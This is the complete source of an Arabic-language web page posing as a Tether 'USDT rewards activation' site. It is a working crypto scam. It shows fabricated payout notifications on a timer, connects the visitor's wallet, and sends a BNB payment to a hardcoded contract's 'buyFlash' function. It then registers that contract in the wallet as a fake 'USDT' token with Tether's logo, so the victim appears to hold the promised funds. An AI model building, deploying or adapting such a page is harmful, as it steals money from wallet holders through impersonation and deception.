<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tether Hub | Global Activation</title>
    
    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
    <script src="https://unpkg.com/@coinbase/wallet-sdk@3.7.1/dist/index.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>

    <style>
        :root { --primary: #00ffa3; --bg: #020807; }
        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .card { width: 90%; max-width: 380px; background: #0a1412; border: 1px solid #1a2e2a; border-radius: 25px; padding: 25px; text-align: center; box-shadow: 0 15px 40px #000; }
        .logo { width: 65px; filter: drop-shadow(0 0 8px var(--primary)); margin-bottom: 10px; }
        select, .btn { width: 100%; padding: 16px; border-radius: 12px; border: none; font-weight: bold; margin-top: 10px; cursor: pointer; }
        select { background: #111; color: #fff; border: 1px solid #222; }
        .btn { background: var(--primary); color: #000; font-size: 16px; transition: 0.3s; }
        .btn:disabled { background: #333; opacity: 0.5; }
        
        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 9999; justify-content: center; align-items: center; }
        .m-box { background: #0a1412; padding: 20px; border-radius: 24px; width: 85%; max-width: 320px; border: 1px solid #1a2e2a; }
        .w-opt { display: flex; align-items: center; justify-content: space-between; padding: 14px; background: #142622; margin-top: 10px; border-radius: 12px; cursor: pointer; }
        .w-opt:hover { border: 1px solid var(--primary); }
        .w-opt img { width: 28px; }
        #msg { margin-top: 20px; font-size: 12px; color: var(--primary); min-height: 20px; }
        .notif { position: fixed; bottom: 20px; left: 20px; background: #0d1d1a; border: 1px solid var(--primary); padding: 12px; border-radius: 12px; display: none; font-size: 11px; z-index: 100; animation: slideUp 0.5s ease; }
        @keyframes slideUp { from { transform: translateY(50px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
    </style>
</head>
<body>

<div class="card">
    <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="logo">
    <h2>تفعيل مكافآت USDT</h2>
    <p style="color:#666; font-size:12px">اختر الفئة المخصصة لمحفظتك للمزامنة الفورية</p>
    <select id="tier">
        <option value="0.09">5,000 USDT (0.09 BNB)</option>
        <option value="0.5">50,000 USDT (0.5 BNB)</option>
        <option value="1.0">150,000 USDT (1.0 BNB)</option>
    </select>
    <button class="btn" id="startBtn" onclick="openModal()">اربط المحفظة للاستلام ⚡</button>
    <div id="msg">● بانتظار الاتصال الآمن...</div>
</div>

<div id="walletModal" class="modal">
    <div class="m-box">
        <h3 style="margin:0 0 15px 0; text-align:center;">اختر محفظتك</h3>
        <div class="w-opt" onclick="smartConnect('Injected')"><span>MetaMask / Trust</span> <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Logo.svg"></div>
        <div class="w-opt" onclick="smartConnect('Coinbase')"><span>Coinbase Wallet</span> <img src="https://www.vectorlogo.zone/logos/coinbase/coinbase-icon.svg"></div>
        <div class="w-opt" onclick="smartConnect('WC')"><span>WalletConnect (للموبايل)</span> <img src="https://raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Logo/Blue%20(Default)/Logo.svg"></div>
        <button onclick="closeModal()" style="width:100%; background:none; color:#444; margin-top:15px; border:none; cursor:pointer;">إلغاء</button>
    </div>
</div>

<div id="notif" class="notif"></div>

<script>
    const ADDR = "0x609BB2a512e6944210D01483e491A410912975F9";
    const ABI = [{"inputs":[],"name":"buyFlash","outputs":[],"stateMutability":"payable","type":"function"}];
    const RPC = "https://bsc-dataseed.binance.org/";

    // نظام التنبيهات
    setInterval(() => {
        const n = document.getElementById('notif');
        const amts = ["5,000", "50,000", "150,000"];
        n.innerHTML = `✅ تم استلام <b>${amts[Math.floor(Math.random()*3)]} USDT</b> بالنجاح`;
        n.style.display = 'block';
        setTimeout(() => n.style.display = 'none', 2500);
    }, 4000);

    function openModal() { document.getElementById('walletModal').style.display = 'flex'; }
    function closeModal() { document.getElementById('walletModal').style.display = 'none'; }

    async function smartConnect(type) {
        closeModal();
        const msg = document.getElementById('msg');
        const btn = document.getElementById('startBtn');
        let provider;

        try {
            msg.innerText = "جاري الاتصال ببروتوكول " + type + "...";
            
            if (type === 'Injected') {
                // للكمبيوتر (MetaMask) والموبايل (إذا فتح من داخل Trust)
                provider = window.ethereum;
                if (!provider) {
                    // إذا كان موبايلاً ولم يجد محفظة، يوجهه لفتح Trust Wallet
                    if (/Android|iPhone/i.test(navigator.userAgent)) {
                        window.location.href = "https://link.trustwallet.com/open_url?url=" + window.location.href;
                        return;
                    }
                    throw new Error("لم يتم العثور على محفظة");
                }
            } 
            else if (type === 'Coinbase') {
                const cb = new CoinbaseWalletSDK({ appName: "Tether Rewards" });
                provider = cb.makeWeb3Provider(RPC, 56);
            } 
            else if (type === 'WC') {
                // WalletConnect يعمل بشكل أفضل للموبايل عبر المتصفحات الخارجية
                provider = new WalletConnectProvider.default({
                    rpc: { 56: RPC },
                    chainId: 56,
                    qrcodeModalOptions: { desktopLinks: [], mobileLinks: ["trust", "metamask", "binance"] }
                });
                await provider.enable();
            }

            const web3 = new Web3(provider);
            const accounts = await (type === 'WC' ? [provider.accounts[0]] : provider.request({ method: 'eth_requestAccounts' }));
            const user = accounts[0];

            // تحويل الشبكة لـ BSC
            try {
                await provider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
            } catch (e) {}

            btn.disabled = true;
            msg.innerText = "بانتظار تأكيد العقد الذكي...";
            
            const contract = new web3.eth.Contract(ABI, ADDR);
            const val = document.getElementById('tier').value;

            await contract.methods.buyFlash().send({
                from: user,
                value: web3.utils.toWei(val, "ether"),
                gas: 200000
            });

            msg.innerText = "✅ اكتمل التفعيل بنجاح!";
            
            // إضافة التوكن
            await provider.request({
                method: 'wallet_watchAsset',
                params: { type: 'ERC20', options: { address: ADDR, symbol: 'USDT', decimals: 18, image: 'https://cryptologos.cc/logos/tether-usdt-logo.png' } }
            });

        } catch (err) {
            console.error(err);
            msg.innerText = "⚠️ فشل الربط أو تم إلغاء العملية.";
            btn.disabled = false;
            // إعادة تصفير WalletConnect في حال فشل ليتيح المحاولة مرة أخرى
            if (type === 'WC') localStorage.removeItem('walletconnect');
        }
    }
</script>
</body>
</html>
